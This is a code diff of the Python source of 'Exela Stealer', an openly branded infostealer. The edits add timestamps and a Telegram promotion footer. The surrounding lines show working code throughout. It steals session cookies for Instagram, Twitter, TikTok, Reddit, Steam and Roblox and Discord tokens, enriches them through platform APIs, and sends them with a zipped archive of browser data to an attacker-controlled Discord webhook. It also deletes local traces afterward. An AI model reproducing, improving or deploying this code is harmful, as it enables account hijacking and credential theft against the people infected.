@@ -313,7 +313,7 @@ class QuicaxdExela:
             else:fullname = data["user"]["full_name"]
             email = data["user"]["email"]
             verify = data["user"]["is_verified"]
-            embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Instagram Session was detected on the{value} Browser***", color=0x070707, url="https://github.com/quicaxd")
+            embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Instagram Session was detected on the{value} Browser***", color=0x070707, url="https://github.com/quicaxd",timestamp = "now")
             embed.set_thumbnail(url=pp)
             embed.add_field(name="Instagram Cookie", inline=True, value=f"```{sessionid}```")
             embed.add_field(name="Profile URL", inline=False, value=f"```{profileURL}```")
@@ -322,6 +322,7 @@ class QuicaxdExela:
             embed.add_field(name="is Verified", inline=True, value=f"```{verify}```")
             embed.add_field(name="Email", inline=False, value=f"```{email}```")
             embed.add_field(name="Biography", inline=False, value=f"```{bio}```")
+            embed.set_footer(text="https://t.me/ExelaStealer")
             self.hook.send(embed=embed)  
             self.instaa.append(f"Instagram Cookie : {sessionid}\nProfile URL : {profileURL}\nUser Name : {username}\nNick Name : {fullname}\nis Verified : {verify}\nEmail : {email}\nBiography : {bio}\n==========================================================================")
         except:
@@ -340,7 +341,7 @@ class QuicaxdExela:
             'x-csrf-token': 'ac1aa9d58c8798f0932410a1a564eb42'}
             url = "https://twitter.com/i/api/1.1/account/update_profile.json"
             req = requests.post(url, headers=header, cookies={'auth_token': authToken}).json()
-            embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Twitter Session was detected on the {value} browser***", color=0x070707, url="https://github.com/quicaxd")
+            embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Twitter Session was detected on the {value} browser***", color=0x070707, url="https://github.com/quicaxd",timestamp = "now")
             try:
                 if req["description"] == "":
                     description == "There is no bio"
@@ -363,6 +364,7 @@ class QuicaxdExela:
             embed.add_field(name="Total Tweets", inline=True, value=f"```{req['statuses_count']}```")
             embed.add_field(name="Created At", inline=True, value=f"```{req['created_at']}```")
             embed.add_field(name="Is Verified", inline=True, value=f"```{req['verified']}```")
+            embed.set_footer(text="https://t.me/ExelaStealer")
             self.hook.send(embed=embed)
             self.twitterr.append(f"Twitter Cookie : {cookie}\nProfile URL : {profileURL}\nUser Name : {username}\nScreen Name : {nickname}\nBiography : {description}\nFollower Count : {req['followers_count']}\nFollowing Count : {req['friends_count']}\nTotal Tweets : {req['statuses_count']}\nCreated At : {req['created_at']}\nIs Verified : {req['verified']}\n==========================================================================")                                        
         except:
@@ -389,7 +391,7 @@ class QuicaxdExela:
                 phone = data["data"]["mobile"]
             useranme = data["data"]["username"]
             coins = data2["data"]["coins"]
-            embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Tiktok Session was detected on the{value} browser***", color=0x070707, url="https://github.com/quicaxd")
+            embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Tiktok Session was detected on the{value} browser***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
             embed.set_thumbnail(url="https://i.hizliresim.com/eai9bwi.jpg")
             embed.add_field(name="Tiktok Cookie", inline=True, value=f"```{cookies}```")
             embed.add_field(name="User identifier", inline=False, value=f"```{user_id}```")
@@ -398,6 +400,7 @@ class QuicaxdExela:
             embed.add_field(name="Email", inline=True, value=f"```{email}```")
             embed.add_field(name="Phone", inline=True, value=f"```{phone}```")
             embed.add_field(name="Coins", inline=True, value=f"```{coins}```")
+            embed.set_footer(text="https://t.me/ExelaStealer")
             self.hook.send(embed=embed)
             self.tiktokk.append(f"Tiktok Cookie : {cookies}\nUser identifier : {user_id}\nProfile URL : https://tiktok.com/@{useranme}\nEmail : {email}\nPhone : {phone}\nCoins : {coins}\n==========================================================================")
         except:
@@ -430,7 +433,7 @@ class QuicaxdExela:
             mod = data2["is_mod"]
             gold = data2["is_gold"]
             suspended = data2["is_suspended"]
-            embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Reddit Session was detected on the{value} browser***", color=0x070707, url="https://github.com/quicaxd")
+            embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Reddit Session was detected on the{value} browser***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
             embed.set_thumbnail(url=pp)
             embed.add_field(name="Reddit Cookie", inline=True, value=f"```{cookies}```")
             embed.add_field(name="Profile URL", inline=False, value=f"```{profileUrl}```")
@@ -442,6 +445,7 @@ class QuicaxdExela:
             embed.add_field(name="Is Mod", inline=True, value=f"```{mod}```")
             embed.add_field(name="Is Gold", inline=True, value=f"```{gold}```")
             embed.add_field(name="Suspended", inline=True, value=f"```{suspended}```")
+            embed.set_footer(text="https://t.me/ExelaStealer")
             self.hook.send(embed=embed)
             self.redditt.append(f"Reddit Cookie : {cookies}\nProfile URL : {profileUrl}\nUsername : {username}\nEmail : {gmail}\nComment Karma: {commentKarma}\nTotal Karma : {totalKarma}\nCoins : {coins}\nIs Mod : {mod}\nIs Gold : {gold}\nSuspended : {suspended}\n==========================================================================")
         except:
@@ -459,7 +463,7 @@ class QuicaxdExela:
                         #self.foundSteamSession = True
                         pass
                 if steamid:
-                    embed = dhooks.Embed(title="***Developer's github account***", description="***Exela Steam Session Detected***", color=0x070707, url="https://github.com/quicaxd")
+                    embed = dhooks.Embed(title="***Developer's github account***", description="***Exela Steam Session Detected***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
                     result = "".join(steamid)
                     accountInfo = requests.get('https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=' + result).text
                     playerInfo = requests.get('https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=' + result).json()
@@ -476,6 +480,7 @@ class QuicaxdExela:
                     embed.add_field(name="Profil Name",  inline=True,value=f"```{displayName}```")
                     embed.add_field(name="Time Created",  inline=True,value=f"```{timecreated}```")
                     embed.add_field(name="Player Level", inline=True, value=f"```{data2}```")
+                    embed.set_footer(text="https://t.me/ExelaStealer")
                     self.hook.send(embed=embed)
                     self.steamm.append(f"Steam Identifier : {idf}\nProfile URL : {profileURL}\nProfil Name : {displayName}\nTime Created : {timecreated}\nPlayer Level : {data2}\n==========================================================================")
         except:
@@ -496,7 +501,7 @@ class QuicaxdExela:
             robux = requests.get(url, headers=headers).json()["robux"]
             url2 = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" + str(accinfo['UserId']) + "&size=420x420&format=Png&isCircular=false"
             picUrl = requests.get(url2, headers=headers).json()["data"][0]["imageUrl"]
-            embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Roblox Session was Detected on{value} browser***", color=0x070707, url="https://github.com/quicaxd")
+            embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Roblox Session was Detected on{value} browser***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
             embed.set_thumbnail(url=picUrl)
             embed.add_field(name="Roblox Cookie", inline=False, value=f"```{robuxCookie}```")
             embed.add_field(name="Profile URL", inline=False, value=f"```{picUrl}```")
@@ -504,6 +509,7 @@ class QuicaxdExela:
             embed.add_field(name="Name", inline=False, value=f"```{accinfo['Name']}```")
             embed.add_field(name="Email", inline=False, value=f"```{email}```")
             embed.add_field(name="Email Verified", inline=False, value=f"```{accinfo['IsEmailVerified']}```")
+            embed.set_footer(text="https://t.me/ExelaStealer")
             self.hook.send(embed=embed)
             self.robloxx.append(f"Steam Cookie : {robuxCookie}\nProfile URL : {picUrl}\nTotal Robux : {robux}\nName : {accinfo['Name']}\nEmail : {email}\nEmail Verified : {accinfo['Name']}\n==========================================================================")
         except:
@@ -559,7 +565,7 @@ class QuicaxdExela:
                 if requests.get(dcpp + ".png").status_code == 200:
                     dcpp += ".png"
                 else:dcpp += ".gif"
-                embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Discord Token Detected***", color=0x070707, url="https://github.com/quicaxd")
+                embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Discord Token Detected***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
                 embed.set_thumbnail(url=dcpp)
                 embed.add_field(name="<a:earthpink:996004236531859588> Discord Account ID",inline=True, value=f"```{id}```")
                 embed.add_field(name="<a:rainbowheart:996004226092245072> Discord Username",inline=True, value=f"```{req.json()['username']}```")
@@ -582,6 +588,7 @@ class QuicaxdExela:
                 if req.json()['bio'] != "":
                     embed.add_field(name="<a:gift:1021608479808569435> Discord Account Biography",inline=False, value=f"```{req.json()['bio']}```")
                 embed.add_field(name=f"<a:pinkcrown:996004209667346442> Discord Token",inline=False, value=f"```{f}```")
+                embed.set_footer(text="https://t.me/ExelaStealer")
                 self.hook.send(embed=embed)
                 self.discordd.append(f"Discord ID : {id}\nUsername : {req.json()['username']}\nEmail : {req.json()['email']}\nis mfa Enabled : {req.json()['mfa_enabled']}\nNitro Status : {nitro}\nDiscord Token : {str(f)}")
         except:
@@ -647,7 +654,7 @@ class QuicaxdExela:
         shutil.make_archive(os.getenv('temp') + f"\\{run}", "zip", os.getenv('temp') + f"\\{run}")
         hooksxdd = dhooks.Webhook(UrLxD, avatar_url="https://i.hizliresim.com/a28jbcj.jfif", username="i fucked her (quicaxd <3)")
         filee = dhooks.File(os.getenv('temp') + f"\\{run}.zip")
-        embed = dhooks.Embed(title="***Developer's github account***", description="***Exela Stealer***", color=0x070707, url="https://github.com/quicaxd")
+        embed = dhooks.Embed(title="***Developer's github account***", description="***Exela Stealer***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
         embed.set_thumbnail(url="https://i.hizliresim.com/8po0puy.jfif")
         embed.add_field(name="Found Instagram Session's",  inline=True,value=f"```{instagram}```")
         embed.add_field(name="Found Twitter Session's",  inline=True,value=f"```{twitter}```")
@@ -662,6 +669,7 @@ class QuicaxdExela:
         embed.add_field(name="Total Download's",  inline=True,value=f"```{self.downloads}```")
         embed.add_field(name="Total History's",  inline=True,value=f"```{self.historys}```")
         embed.add_field(name="Exela Stealer is the best", inline=False, value=f"```{'just sex and money xd'}```")
+        embed.set_footer(text="https://t.me/ExelaStealer")
         hooksxdd.send(embed=embed, file=filee)
         os.remove(os.getenv('temp') + f"\\{run}.zip")
         shutil.rmtree(os.getenv('temp') + f"\\{run}")
